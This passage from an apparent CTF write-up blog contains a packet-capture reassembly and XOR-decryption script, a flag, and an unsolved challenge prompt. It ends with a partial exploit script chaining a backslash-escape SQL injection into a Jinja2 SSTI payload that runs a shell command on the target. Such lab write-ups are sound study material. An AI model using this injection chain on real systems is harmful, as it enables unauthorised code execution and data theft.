</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>scapy</span><span class=o>.</span><span class=n>TCP</span> <span class=ow>in</span> <span class=n>pkt</span> <span class=ow>and</span> <span class=n>scapy</span><span class=o>.</span><span class=n>IP</span> <span class=ow>in</span> <span class=n>pkt</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>ip</span> <span class=o>=</span> <span class=n>pkt</span><span class=p>[</span><span class=n>scapy</span><span class=o>.</span><span class=n>IP</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>tcp</span> <span class=o>=</span> <span class=n>pkt</span><span class=p>[</span><span class=n>scapy</span><span class=o>.</span><span class=n>TCP</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>ip</span><span class=o>.</span><span class=n>dst</span> <span class=o>==</span> <span class=n>target_ip</span> <span class=ow>and</span> <span class=n>tcp</span><span class=o>.</span><span class=n>dport</span> <span class=o>==</span> <span class=n>target_port</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>stream_key</span> <span class=o>=</span> <span class=p>(</span><span class=n>ip</span><span class=o>.</span><span class=n>src</span><span class=p>,</span> <span class=n>tcp</span><span class=o>.</span><span class=n>sport</span><span class=p>,</span> <span class=n>ip</span><span class=o>.</span><span class=n>dst</span><span class=p>,</span> <span class=n>tcp</span><span class=o>.</span><span class=n>dport</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>stream_key</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>streams</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>streams</span><span class=p>[</span><span class=n>stream_key</span><span class=p>]</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>            <span class=n>streams</span><span class=p>[</span><span class=n>stream_key</span><span class=p>]</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>pkt</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Found </span><span class=si>{</span><span class=nb>len</span><span class=p>(</span><span class=n>streams</span><span class=p>)</span><span class=si>}</span><span class=s2> streams to target.&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>stream_key</span><span class=p>,</span> <span class=n>stream_packets</span> <span class=ow>in</span> <span class=n>streams</span><span class=o>.</span><span class=n>items</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=c1># Sort by sequence number to handle out-of-order</span>
</span></span><span class=line><span class=cl>    <span class=n>stream_packets</span><span class=o>.</span><span class=n>sort</span><span class=p>(</span><span class=n>key</span><span class=o>=</span><span class=k>lambda</span> <span class=n>p</span><span class=p>:</span> <span class=n>p</span><span class=p>[</span><span class=n>scapy</span><span class=o>.</span><span class=n>TCP</span><span class=p>]</span><span class=o>.</span><span class=n>seq</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>unique_packets</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=n>seen_seqs</span> <span class=o>=</span> <span class=nb>set</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>p</span> <span class=ow>in</span> <span class=n>stream_packets</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>seq</span> <span class=o>=</span> <span class=n>p</span><span class=p>[</span><span class=n>scapy</span><span class=o>.</span><span class=n>TCP</span><span class=p>]</span><span class=o>.</span><span class=n>seq</span>
</span></span><span class=line><span class=cl>        <span class=c1># We also need to consider payload length, but simple seq check helps</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>seq</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>seen_seqs</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>unique_packets</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>p</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>seen_seqs</span><span class=o>.</span><span class=n>add</span><span class=p>(</span><span class=n>seq</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=c1># Reassemble payload</span>
</span></span><span class=line><span class=cl>    <span class=n>full_payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>p</span> <span class=ow>in</span> <span class=n>unique_packets</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>scapy</span><span class=o>.</span><span class=n>Raw</span> <span class=ow>in</span> <span class=n>p</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>full_payload</span> <span class=o>+=</span> <span class=n>p</span><span class=p>[</span><span class=n>scapy</span><span class=o>.</span><span class=n>Raw</span><span class=p>]</span><span class=o>.</span><span class=n>load</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Stream </span><span class=si>{</span><span class=n>stream_key</span><span class=si>}</span><span class=s2>: </span><span class=si>{</span><span class=nb>len</span><span class=p>(</span><span class=n>stream_packets</span><span class=p>)</span><span class=si>}</span><span class=s2> packets, payload size: </span><span class=si>{</span><span class=nb>len</span><span class=p>(</span><span class=n>full_payload</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>full_payload</span><span class=p>)</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;  Head: </span><span class=si>{</span><span class=n>full_payload</span><span class=p>[:</span><span class=mi>50</span><span class=p>]</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>full_payload</span><span class=p>)</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=c1># Check if it looks like a multipart body (starts with --)</span>
</span></span><span class=line><span class=cl>        <span class=c1># OR contains POST /upload</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=sa>b</span><span class=s2>&#34;POST /upload&#34;</span> <span class=ow>in</span> <span class=n>full_payload</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Processing stream </span><span class=si>{</span><span class=n>stream_key</span><span class=si>}</span><span class=s2> (Found POST header)&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=c1># Try to find boundary in headers</span>
</span></span><span class=line><span class=cl>            <span class=n>boundary_match</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=sa>rb</span><span class=s1>&#39;Content-Type: multipart/form-data; boundary=(.+?)\r\n&#39;</span><span class=p>,</span> <span class=n>full_payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>boundary_match</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>boundary</span> <span class=o>=</span> <span class=n>boundary_match</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=c1># Fallback: try to find boundary from body start</span>
</span></span><span class=line><span class=cl>                <span class=c1># Look for first line starting with --</span>
</span></span><span class=line><span class=cl>                <span class=k>match</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=sa>rb</span><span class=s1>&#39;(--[a-zA-Z0-9]+)\r\n&#39;</span><span class=p>,</span> <span class=n>full_payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=k>match</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=n>boundary</span> <span class=o>=</span> <span class=k>match</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>1</span><span class=p>)[</span><span class=mi>2</span><span class=p>:]</span> <span class=c1># strip --</span>
</span></span><span class=line><span class=cl>                <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;  No boundary found.&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                    <span class=k>continue</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>full_payload</span><span class=o>.</span><span class=n>startswith</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;--&#39;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Processing stream </span><span class=si>{</span><span class=n>stream_key</span><span class=si>}</span><span class=s2> (Found Body start)&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=c1># Extract boundary from first line</span>
</span></span><span class=line><span class=cl>            <span class=n>first_line_end</span> <span class=o>=</span> <span class=n>full_payload</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\r\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>first_line_end</span> <span class=o>!=</span> <span class=o>-</span><span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>boundary</span> <span class=o>=</span> <span class=n>full_payload</span><span class=p>[</span><span class=mi>2</span><span class=p>:</span><span class=n>first_line_end</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;  Cannot parse boundary.&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>continue</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>continue</span>
</span></span><span class=line><span class=cl>            
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;  Boundary: </span><span class=si>{</span><span class=n>boundary</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=c1># Split by boundary</span>
</span></span><span class=line><span class=cl>        <span class=c1># The body parts are separated by --boundary</span>
</span></span><span class=line><span class=cl>        <span class=n>parts</span> <span class=o>=</span> <span class=n>full_payload</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;--&#39;</span> <span class=o>+</span> <span class=n>boundary</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>part</span> <span class=ow>in</span> <span class=n>parts</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=sa>b</span><span class=s1>&#39;filename=&#34;&#39;</span> <span class=ow>in</span> <span class=n>part</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=c1># Extract filename</span>
</span></span><span class=line><span class=cl>                <span class=n>filename_match</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=sa>rb</span><span class=s1>&#39;filename=&#34;(.+?)&#34;&#39;</span><span class=p>,</span> <span class=n>part</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>filename_match</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=n>filename</span> <span class=o>=</span> <span class=n>filename_match</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>,</span> <span class=n>errors</span><span class=o>=</span><span class=s1>&#39;ignore&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                    
</span></span><span class=line><span class=cl>                    <span class=c1># Extract content</span>
</span></span><span class=line><span class=cl>                    <span class=c1># Look for double CRLF</span>
</span></span><span class=line><span class=cl>                    <span class=n>header_end</span> <span class=o>=</span> <span class=n>part</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\r\n\r\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                    <span class=k>if</span> <span class=n>header_end</span> <span class=o>!=</span> <span class=o>-</span><span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                        <span class=c1># The content ends with \r\n before the next boundary, </span>
</span></span><span class=line><span class=cl>                        <span class=c1># but split() removed the next boundary.</span>
</span></span><span class=line><span class=cl>                        <span class=c1># However, the part string might end with \r\n (or \r\n--)</span>
</span></span><span class=line><span class=cl>                        <span class=c1># The split consumes &#39;--boundary&#39;, but the preceding \r\n is part of the &#39;part&#39; string usually?</span>
</span></span><span class=line><span class=cl>                        <span class=c1># Actually, multipart format is:</span>
</span></span><span class=line><span class=cl>                        <span class=c1># --boundary\r\nHeaders\r\n\r\nBody\r\n--boundary</span>
</span></span><span class=line><span class=cl>                        
</span></span><span class=line><span class=cl>                        <span class=c1># So &#39;part&#39; will start with \r\nHeaders... and end with \r\n</span>
</span></span><span class=line><span class=cl>                        
</span></span><span class=line><span class=cl>                        <span class=n>body</span> <span class=o>=</span> <span class=n>part</span><span class=p>[</span><span class=n>header_end</span><span class=o>+</span><span class=mi>4</span><span class=p>:]</span>
</span></span><span class=line><span class=cl>                        <span class=c1># Trim trailing \r\n</span>
</span></span><span class=line><span class=cl>                        <span class=k>if</span> <span class=n>body</span><span class=o>.</span><span class=n>endswith</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\r\n</span><span class=s1>&#39;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                            <span class=n>body</span> <span class=o>=</span> <span class=n>body</span><span class=p>[:</span><span class=o>-</span><span class=mi>2</span><span class=p>]</span>
</span></span><span class=line><span class=cl>                        
</span></span><span class=line><span class=cl>                        <span class=c1># The body is the hex string</span>
</span></span><span class=line><span class=cl>                        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                            <span class=n>hex_str</span> <span class=o>=</span> <span class=n>body</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;ascii&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span>
</span></span><span class=line><span class=cl>                            <span class=c1># It might be very long</span>
</span></span><span class=line><span class=cl>                            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;  Found file: </span><span class=si>{</span><span class=n>filename</span><span class=si>}</span><span class=s2>, hex length: </span><span class=si>{</span><span class=nb>len</span><span class=p>(</span><span class=n>hex_str</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                            
</span></span><span class=line><span class=cl>                            <span class=n>encrypted_bytes</span> <span class=o>=</span> <span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=n>hex_str</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                            <span class=n>decrypted_bytes</span> <span class=o>=</span> <span class=n>xor_file</span><span class=p>(</span><span class=n>encrypted_bytes</span><span class=p>,</span> <span class=n>KEY</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                            
</span></span><span class=line><span class=cl>                            <span class=n>save_path</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>OUTPUT_DIR</span><span class=p>,</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>basename</span><span class=p>(</span><span class=n>filename</span><span class=p>))</span>
</span></span><span class=line><span class=cl>                            <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=n>save_path</span><span class=p>,</span> <span class=s1>&#39;wb&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                                <span class=n>f</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>decrypted_bytes</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;  Success: Saved to </span><span class=si>{</span><span class=n>save_path</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                            
</span></span><span class=line><span class=cl>                        <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;  Failed to process </span><span class=si>{</span><span class=n>filename</span><span class=si>}</span><span class=s2>: </span><span class=si>{</span><span class=n>e</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>在其中一张图里找到了flag</p><p><img src=https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Picimage-20260111215009-essj4un.png alt=image></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>uoftctf<span class=o>{</span>b4by_w1r3sh4rk_an4lys1s<span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=my-pokemon-card-is-fake--状态runningreproduction>My Pokemon Card is Fake! | 状态:running｜Reproduction</h2><p><strong>题目描述</strong></p><p>Han Shangyan noticed that recently, Tong Nian has been getting into Pokemon cards. So, what could be a better present than a literal prototype for the original Charizard? Not only that, it has been authenticated and graded a PRISTINE GEM MINT 10 by CGC!!!</p><p>Han Shangyan was able to talk the seller down to a modest 6-7 figure sum (not kidding btw), but when he got home, he had an uneasy feeling for some reason. Can you help him uncover the secrets that lie behind these cards?</p><p>What you will need to find:</p><ol><li>Date and time (relative to the printer, and 24-hour clock) that it was printed.</li><li>Printer&rsquo;s serial number.</li></ol><p>The flag format will be uoftctf{YYYY_MM_DD_HH:MM_SERIALNUM}</p><p>Example: uoftctf{9999_09_09_23:59_676767676}</p><p>Notes:</p><ol><li>You&rsquo;re free to dig more into the whole situation after you&rsquo;ve solved the challenge, it&rsquo;s very interesting, though so much hasn&rsquo;t been or can&rsquo;t be said :(</li><li>Two days after I write this challenge, I&rsquo;m going to meet the person whose name was used for all this again. Hopefully I&rsquo;ll be back to respond to tickets!!!</li></ol><p><strong>WriteUp</strong></p><p>暂无</p><h1 id=web>Web</h1><h2 id=no-quotes--状态solvedlive>No Quotes | 状态:solved｜Live</h2><p><strong>题目描述</strong></p><p>Unless it&rsquo;s from &ldquo;Go Go Squid!&rdquo;, no quotes are allowed here! Let this wholesome quote heal your soul:</p><p>Ai Qing: &ldquo;If you didn&rsquo;t know about robot combat back then, what would you be doing?&rdquo;</p><p>Wu Bai: &ldquo;There&rsquo;s no if. As long as you&rsquo;re here, I&rsquo;ll be here.&rdquo;</p><p><strong>WriteUp</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sys</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Configuration</span>
</span></span><span class=line><span class=cl><span class=n>TARGET_URL</span> <span class=o>=</span> <span class=s2>&#34;http://localhost:5001&#34;</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>)</span> <span class=o>&gt;</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>TARGET_URL</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=ow>not</span> <span class=n>TARGET_URL</span><span class=o>.</span><span class=n>startswith</span><span class=p>(</span><span class=s2>&#34;http://&#34;</span><span class=p>)</span> <span class=ow>and</span> <span class=ow>not</span> <span class=n>TARGET_URL</span><span class=o>.</span><span class=n>startswith</span><span class=p>(</span><span class=s2>&#34;https://&#34;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>TARGET_URL</span> <span class=o>=</span> <span class=s2>&#34;https://&#34;</span> <span class=o>+</span> <span class=n>TARGET_URL</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>LOGIN_URL</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>TARGET_URL</span><span class=si>}</span><span class=s2>/login&#34;</span>
</span></span><span class=line><span class=cl><span class=n>HOME_URL</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>TARGET_URL</span><span class=si>}</span><span class=s2>/home&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>solve</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[*] Targeting: </span><span class=si>{</span><span class=n>TARGET_URL</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># SSTI Payload to execute /readflag</span>
</span></span><span class=line><span class=cl>    <span class=c1># We use the standard RCE payload for Jinja2</span>
</span></span><span class=line><span class=cl>    <span class=n>ssti_payload</span> <span class=o>=</span> <span class=s2>&#34;{{ self.__init__.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;/readflag&#39;).read() }}&#34;</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=c1># Convert payload to hex for SQL injection (to avoid quotes)</span>
</span></span><span class=line><span class=cl>    <span class=n>ssti_hex</span> <span class=o>=</span> <span class=s2>&#34;0x&#34;</span> <span class=o>+</span> <span class=n>ssti_payload</span><span class=o>.</span><span class=n>encode</span><span class=p>()</span><span class=o>.</span><span class=n>hex</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=c1># SQL Injection Payload</span>
</span></span><span class=line><span class=cl>    <span class=c1># Username: \  -&gt; Escapes the closing quote, consuming the query up to the next quote</span>
</span></span><span class=line><span class=cl>    <span class=c1># Password: UNION SELECT 1, &lt;HEX_PAYLOAD&gt; #</span>
</span></span><span class=line><span class=cl>    <span class=c1>#</span>
</span></span><span class=line><span class=cl>    <span class=c1># Query logic:</span>
</span></span><span class=line><span class=cl>    <span class=c1># SELECT ... WHERE username = (&#39;{username}&#39;) AND password = (&#39;{password}&#39;)</span>
</span></span><span class=line><span class=cl>    <span class=c1># With username=\:</span>
</span></span><span class=line><span class=cl>    <span class=c1># SELECT ... WHERE username = (&#39;\&#39;) AND password = (&#39;{password}&#39;)</span>
</span></span><span class=line><span class=cl>    <span class=c1># The string literal becomes: &#39;) AND password = (</span>
</span></span><span class=line><span class=cl>    <span class=c1># The rest of the query is interpreted as SQL: {password}&#39;)</span>
</span></span><span class=line><span class=cl>    <span class=c1># We inject UNION SELECT to return our payload as the username.</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=n>username</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=se>\\</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>    <span class=c1># We need to close the parenthesis opened by &#34;username = (&#34;</span>
</span></span><span class=line><span class=cl>    <span class=c1># The backslash consumed the original closing quote and parenthesis into the string.</span>
</span></span><span class=line><span class=cl>    <span class=c1># So the query structure is: WHERE username = ( &#39;string_literal&#39; [INJECTED]</span>
</span></span><span class=line><span class=cl>    <span class=c1># We need to add &#39;)&#39; to close it.</span>
</span></span><span class=line><span class=cl>    <span class=n>password</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;) UNION SELECT 1, </span><span class=si>{</span><span class=n>ssti_hex</span><span class=si>}</span><span class=s2> -- &#34;</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[*] Sending exploit payload...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>session</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>Session</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;username&#34;</span><span class=p>:</span> <span class=n>username</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;password&#34;</span><span class=p>:</span> <span class=n>password</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=n>response</span> <span class=o>=</span> <span class=n>session</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>LOGIN_URL</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>response</span><span class=o>.</span><span class=n>status_code</span> <span class=o>==</span> <span class=mi>200</span> <span class=ow>and</span> <span class=s2>&#34;Invalid credentials&#34;</span> <span class=ow>in</span> <span class=n>response</span><span class=o>.</span><span class=n>text</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[-] Login failed. Exploit might need adjustment.&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=c1># Debugging output</span>
</span></span><span class=line><span class=cl>        <span class=c1># print(response.text)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Check if we are redirected or logged in</span>
</span></span><span class=line><span class=cl>    <span class=c1># The app returns a redirect on success, requests follows it automatically</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>response</span><span class=o>.</span><span class=n>url</span> <span class=o>==</span> <span class=n>HOME_URL</span> <span class=ow>or</span> <span class=s2>&#34;Welcome,&#34;</span> <span class=ow>in</span> <span class=n>response</span><span class=o>.</span><span class=n>text</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[+] Login successful! Checking for flag...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=c1># The home page renders the username using render_template_string</span>
</span></span><span class=line><span class=cl>        <span class=c1># triggering the SSTI payload.</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=s2>&#34;uoftctf{&#34;</span> <span class=ow>in</span> <span class=n>response</span><span class=o>.</span><span class=n>text</span><span class=p>:</span>
